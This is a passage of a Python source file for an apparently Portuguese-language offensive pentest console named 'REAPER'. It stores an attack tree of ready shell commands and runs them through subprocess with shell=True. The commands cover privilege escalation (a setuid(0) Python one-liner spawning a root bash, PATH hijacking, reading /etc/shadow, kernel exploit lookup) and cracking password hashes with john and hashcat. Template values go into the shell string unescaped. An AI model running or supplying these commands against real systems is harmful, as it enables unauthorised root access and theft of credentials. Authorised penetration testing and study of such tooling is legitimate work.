                "followup": {
                    "success": ["privesc_caps_exploit"],
                    "fail":    ["privesc_path"]
                },
                "hints": "Perigoso: cap_setuid+ep, cap_net_raw+ep\nExemplo python3: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
            },
            {
                "name": "PATH Hijacking",
                "desc": "Substituir binário no PATH por script malicioso",
                "params": [
                    {"key": "binario", "label": "Binário a hijack (ex: curl, wget)", "default": ""},
                ],
                "cmd": "echo $PATH; find / -writable -type d 2>/dev/null | head -20",
                "followup": {
                    "success": ["root_shell"],
                    "fail":    ["privesc_kernel"]
                },
                "hints": "Se encontrares directoria writable no PATH:\n  echo '/bin/bash' > /tmp/{binario}\n  chmod +x /tmp/{binario}\n  export PATH=/tmp:$PATH"
            },
            {
                "name": "Kernel exploit",
                "desc": "Explorar vulnerabilidade no kernel Linux",
                "params": [],
                "cmd": "uname -a && cat /etc/os-release",
                "followup": {
                    "success": [],
                    "fail":    []
                },
                "hints": "Com a versão do kernel: searchsploit linux kernel <versao>\nFerramentas: linux-exploit-suggester, linux-smart-enumeration"
            },
            {
                "name": "Password reutilizada — /etc/passwd + shadow",
                "desc": "Tentar ler shadow e crackear hashes",
                "params": [],
                "cmd": "cat /etc/shadow 2>/dev/null || cat /etc/passwd",
                "followup": {
                    "success": ["crack_shadow_hashes"],
                    "fail":    ["privesc_kernel"]
                },
                "hints": "Se conseguires ler /etc/shadow:\n  unshadow /etc/passwd /etc/shadow > hashes.txt\n  john --wordlist=rockyou.txt hashes.txt"
            },
        ]
    },

    # ── Cracking de Hashes ───────────────────────────────────
    "hashes": {
        "label": "Cracking de Hashes",
        "color": "yellow",
        "icon": "🔓",
        "detect": lambda ports, banners: False,
        "attacks": [
            {
                "name": "John the Ripper",
                "desc": "Crackear hashes com dicionário",
                "params": [
                    {"key": "hash_file","label": "Ficheiro com hash(es)", "default": "hash.txt"},
                    {"key": "wordlist", "label": "Wordlist",              "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "john --wordlist={wordlist} {hash_file} && john --show {hash_file}",
                "followup": {"success": [], "fail": ["hashcat"]},
                "hints": "Para identificar o tipo: hash-identifier <hash>"
            },
            {
                "name": "Hashcat — GPU cracking",
                "desc": "Crackear hashes com GPU (mais rápido)",
                "params": [
                    {"key": "modo",     "label": "Modo: 0=MD5 100=SHA1 1800=sha512crypt 3200=bcrypt", "default": "0"},
                    {"key": "hash_file","label": "Ficheiro com hash", "default": "hash.txt"},
                    {"key": "wordlist", "label": "Wordlist",          "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "hashcat -m {modo} {hash_file} {wordlist}",
                "followup": {"success": [], "fail": []},
                "hints": "Para identificar modo: hashcat --example-hashes | grep -i <tipo>"
            },
            {
                "name": "Unshadow + John",
                "desc": "Combinar passwd+shadow e crackear",
                "params": [
                    {"key": "passwd",   "label": "Ficheiro /etc/passwd", "default": "/etc/passwd"},
                    {"key": "shadow",   "label": "Ficheiro /etc/shadow", "default": "/etc/shadow"},
                    {"key": "wordlist", "label": "Wordlist",             "default": "/usr/share/wordlists/rockyou.txt"},
                ],
                "cmd": "unshadow {passwd} {shadow} > combined.txt && john --wordlist={wordlist} combined.txt",
                "followup": {"success": [], "fail": []},
                "hints": "Após crackear: john --show combined.txt"
            },
        ]
    },
}

# ═══════════════════════════════════════════════════════════
#  FUNÇÕES DO MOTOR DE INTELIGÊNCIA
# ═══════════════════════════════════════════════════════════

def detect_vectors(scan_output, target):
    """Analisa output do nmap e devolve vectores detectados."""
    ports_found = re.findall(r'(\d+)/tcp\s+open', scan_output)
    ports_found += re.findall(r'(\d+)/udp\s+open', scan_output)
    banners = scan_output.lower()

    detected = []
    for key, vector in ATTACK_TREE.items():
        if key in ("privesc", "hashes"):
            continue
        try:
            if vector["detect"](ports_found, banners):
                detected.append(key)
        except Exception:
            pass
    return detected, ports_found

def intelligence_menu(project, save_fn, color="red"):
    """Menu principal do motor de inteligência."""
    target = project.get("target", "")

    while True:
        console.clear()
        _banner_intel()

        console.print(Panel(
            f"[bold]Alvo:[/bold] [yellow]{target}[/yellow]",
            title="[bold red]🧠 MOTOR DE INTELIGÊNCIA[/bold red]",
            border_style="red", padding=(0,2)
        ))
        console.print()

        # Menu de entrada
        menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
        menu.add_column(style="bold cyan", width=6)
        menu.add_column()
        menu.add_row("[1]", "Analisar output do nmap (detectar vectores automaticamente)")
        menu.add_row("[2]", "Escolher vector manualmente")
        menu.add_row("[3]", "Escalada de Privilégios (após acesso inicial)")
        menu.add_row("[4]", "Cracking de Hashes")
        menu.add_row("[B]", "Voltar")
        console.print(menu)
        console.print()

        ch = Prompt.ask("[bold red]REAPER › Intel[/bold red]").strip().upper()

        if ch == "B":
            break
        elif ch == "1":
            scan_output = _get_scan_output(project)
            if scan_output:
                _auto_detect_and_attack(scan_output, target, project, save_fn)
        elif ch == "2":
            _manual_vector_menu(target, project, save_fn)
        elif ch == "3":
            _attack_vector_menu("privesc", target, project, save_fn)
        elif ch == "4":
            _attack_vector_menu("hashes", target, project, save_fn)

def _banner_intel():
    from rich.align import Align
    from rich.text import Text
    console.print(Align.center(Text("[ REAPER — INTELLIGENCE ENGINE ]", style="bold red")))
    console.print(Rule(style="red"))

def _get_scan_output(project):
    """Pede ao utilizador para colar ou carregar output do nmap."""
    console.print()
    console.print(Panel(
        "[cyan]Cola aqui o output do nmap (ou caminho para ficheiro .txt)[/cyan]\n"
        "[dim]Termina com uma linha que contenha apenas: FIM[/dim]",
        border_style="cyan"
    ))
    console.print()

    opt = Prompt.ask("[cyan]Opção[/cyan]\n  [1] Colar output directamente\n  [2] Carregar de ficheiro\n  [B] Cancelar\n\nEscolha").strip().upper()

    if opt == "B":
        return None
    elif opt == "2":
        path = Prompt.ask("[cyan]Caminho do ficheiro[/cyan]").strip()
        try:
            with open(path) as f:
                return f.read()
        except Exception as e:
            console.print(f"[red]Erro ao ler ficheiro: {e}[/red]")
            return None
    else:
        lines = []
        console.print("[dim]Cola o output e escreve FIM numa linha vazia para terminar:[/dim]")
        while True:
            line = input()
            if line.strip().upper() == "FIM":
                break
            lines.append(line)
        return "\n".join(lines)

def _auto_detect_and_attack(scan_output, target, project, save_fn):
    """Detecta vectores no output e apresenta menu de ataque."""
    detected, ports = detect_vectors(scan_output, target)

    console.clear()
    _banner_intel()

    if not detected:
        console.print(Panel(
            "[yellow]Nenhum vector conhecido detectado automaticamente.\n"
            "Usa a opção 'Escolher vector manualmente'.[/yellow]",
            border_style="yellow"
        ))
        _pause()
        return

    console.print(Panel(
        f"[green]Vectores detectados:[/green] [bold]{len(detected)}[/bold]  |  "
        f"[green]Portos abertos:[/green] {', '.join(ports[:10])}",
        border_style="green"
    ))
    console.print()

    t = Table(box=box.ROUNDED, border_style="red", header_style="bold red", show_lines=True)
    t.add_column("#",       style="bold cyan",  width=4,  justify="center")
    t.add_column("Vector",  style="bold white", width=20)
    t.add_column("Serviço", style="dim white",  width=40)

    for i, key in enumerate(detected, 1):
        v = ATTACK_TREE[key]
        t.add_row(str(i), f"{v['icon']} {v['label']}", f"Portos relacionados detectados")

    console.print(t)
    console.print()
    console.print("[dim][número] Atacar vector  [B] Voltar[/dim]")

    while True:
        ch = Prompt.ask("[bold red]REAPER › Vectores[/bold red]").strip().upper()
        if ch == "B":
            break
        elif ch.isdigit() and 1 <= int(ch) <= len(detected):
            key = detected[int(ch)-1]
            _attack_vector_menu(key, target, project, save_fn)
            # Após voltar, mostra de novo os vectores
            console.clear()
            _banner_intel()
            console.print(t)
            console.print()
            console.print("[dim][número] Atacar vector  [B] Voltar[/dim]")

def _manual_vector_menu(target, project, save_fn):
    """Escolha manual de vector de ataque."""
    console.clear()
    _banner_intel()

    all_vectors = [(k, v) for k, v in ATTACK_TREE.items() if k not in ("privesc","hashes")]

    t = Table(box=box.ROUNDED, border_style="red", header_style="bold red", show_lines=True)
    t.add_column("#",       style="bold cyan",  width=4, justify="center")
    t.add_column("Vector",  style="bold white", width=22)
    t.add_column("Descrição", style="dim white", width=40)

    for i, (k, v) in enumerate(all_vectors, 1):
        num_attacks = len(v["attacks"])
        t.add_row(str(i), f"{v['icon']} {v['label']}", f"{num_attacks} técnicas disponíveis")

    console.print(t)
    console.print()
    console.print("[dim][número] Escolher  [B] Voltar[/dim]")

    ch = Prompt.ask("[bold red]REAPER › Vector[/bold red]").strip().upper()
    if ch != "B" and ch.isdigit() and 1 <= int(ch) <= len(all_vectors):
        key = all_vectors[int(ch)-1][0]
        _attack_vector_menu(key, target, project, save_fn)

def _attack_vector_menu(vector_key, target, project, save_fn):
    """Menu de ataques para um vector específico."""
    vector = ATTACK_TREE[vector_key]
    color  = vector["color"]
    attacks = vector["attacks"]

    # Histórico de tentativas nesta sessão
    tried    = set()
    success  = set()

    while True:
        console.clear()
        _banner_intel()
        console.print(Panel(
            f"[{color}]{vector['icon']} {vector['label'].upper()}[/{color}]\n"
            f"[dim]Alvo: {target}[/dim]",
            border_style=color
        ))
        console.print()

        t = Table(box=box.ROUNDED, border_style=color, header_style=f"bold {color}", show_lines=True)
        t.add_column("#",          style=f"bold {color}", width=4, justify="center")
        t.add_column("Técnica",    style="bold white",    width=28)
        t.add_column("Descrição",  style="dim white",     width=38)
        t.add_column("Estado",     width=10, justify="center")

        for i, atk in enumerate(attacks, 1):
            if i in success:
                estado = "[green]✔ OK[/green]"
            elif i in tried:
                estado = "[red]✘ Fail[/red]"
            else:
                estado = "[dim]—[/dim]"
            t.add_row(str(i), atk["name"], atk["desc"], estado)

        console.print(t)
        console.print()
        console.print("[dim][número] Executar técnica  [B] Voltar[/dim]")

        ch = Prompt.ask(f"[{color}]REAPER › {vector['label']}[/{color}]").strip().upper()
        if ch == "B":
            break
        elif ch.isdigit() and 1 <= int(ch) <= len(attacks):
            idx    = int(ch)
            result = _run_attack(attacks[idx-1], target, color, project, save_fn)
            tried.add(idx)
            if result == "success":
                success.add(idx)

def _run_attack(attack, target, color, project, save_fn):
    """Executa um ataque específico com recolha de parâmetros."""
    console.clear()
    _banner_intel()

    console.print(Panel(
        f"[{color}]{attack['name'].upper()}[/{color}]\n[dim]{attack['desc']}[/dim]",
        border_style=color
    ))
    console.print()

    # Dicas
    if attack.get("hints"):
        console.print(Panel(
            f"[yellow]💡 DICAS[/yellow]\n{attack['hints']}",
            border_style="yellow", padding=(0,2)
        ))
        console.print()

    # Parâmetros
    values = {}
    params = [dict(p) for p in attack.get("params", [])]
    for p in params:
        p["default"] = p["default"].replace("{TARGET}", target)

    if params:
        console.print(f"[{color}]Parâmetros:[/{color}] [dim](ENTER para aceitar)[/dim]\n")
        for p in params:
            d = p["default"]
            label_clean = p['label'].lower().replace(" ", "")
            d_clean = d.lower().replace(" ", "") if d else ""
            show_default = d and d_clean not in label_clean and label_clean not in d_clean
            if show_default:
                label_str = f"  [{color}]{p['label']}[/{color}] [dim]({d})[/dim]"
            else:
                label_str = f"  [{color}]{p['label']}[/{color}]"
            val = Prompt.ask(label_str, default=d)
            values[p["key"]] = val
    else:
        console.print("[dim]Este comando não necessita de parâmetros adicionais.[/dim]\n")

    # Montar comando
    cmd = attack["cmd"]
    for k, v in values.items():
        cmd = cmd.replace("{" + k + "}", v)

    console.print()
    console.print(Panel(f"[bold green]{cmd}[/bold green]", title="Comando", border_style="green"))
    console.print()

    # Acções
    opts = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
    opts.add_column(style="bold cyan", width=6); opts.add_column()
    opts.add_row("[1]", "Executar agora")
    opts.add_row("[2]", "Guardar nas notas")
    opts.add_row("[3]", "Executar e guardar")
    opts.add_row("[B]", "Voltar")
    console.print(opts)

    ch = Prompt.ask(f"[{color}]Acção[/{color}]").strip().upper()

    if ch in ["1", "3"]:
        console.print(f"\n[yellow]A executar...[/yellow]\n")
        console.print(Rule(style="dim green"))
        try:
            subprocess.run(cmd, shell=True)
        except KeyboardInterrupt:
            console.print("\n[yellow]Interrompido.[/yellow]")
        console.print(Rule(style="dim green"))
        console.print()

    if ch in ["2", "3"]:
        phase_data = project["phases"].get("5", {})
        existing   = phase_data.get("notas", "")
        ts         = datetime.datetime.now().strftime("%H:%M:%S")
        entry      = f"[{ts}] {attack['name']}: {cmd}"
        phase_data["notas"] = (existing + "\n" + entry).strip()
        project["phases"]["5"] = phase_data
        save_fn()
        console.print(f"[green]✔ Guardado nas notas.[/green]")

    if ch in ["1", "3"]:
        # Perguntar resultado
        console.print()
        res = Prompt.ask(
            f"[{color}]Resultado[/{color}]\n  [1] Sucesso — funcionou!\n  [2] Falhou\n  [B] Continuar\n\nEscolha"
        ).strip()

        if res == "1":
            _show_next_steps(attack, "success", color)
            return "success"
        elif res == "2":
            _show_next_steps(attack, "fail", color)
            return "fail"
    else:
        _pause()
    return None

def _show_next_steps(attack, outcome, color):
    """Mostra sugestões de próximos passos consoante o resultado."""
    followup = attack.get("followup", {}).get(outcome, [])
    console.print()

    if outcome == "success":
        console.print(Panel("[bold green]✔ SUCESSO![/bold green]\nPróximos passos sugeridos:", border_style="green"))
    else:
        console.print(Panel("[bold red]✘ Falhou[/bold red]\nTenta estes vectores alternativos:", border_style="red"))

    if followup:
        for i, step in enumerate(followup, 1):
            console.print(f"  [{i}] [cyan]{step.replace('_', ' ').title()}[/cyan]")
    else:
        console.print("  [dim]Sem sugestões automáticas — volta ao menu e tenta outro vector.[/dim]")

    console.print()
    _pause()

def _pause():
    console.print("[dim]Prima ENTER para continuar...[/dim]")
    input()



# ── Entry point ──────────────────────────────────────────────
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        console.print("\n\n[bold red]Interrompido. Sessão terminada.[/bold red]\n")
        sys.exit(0)
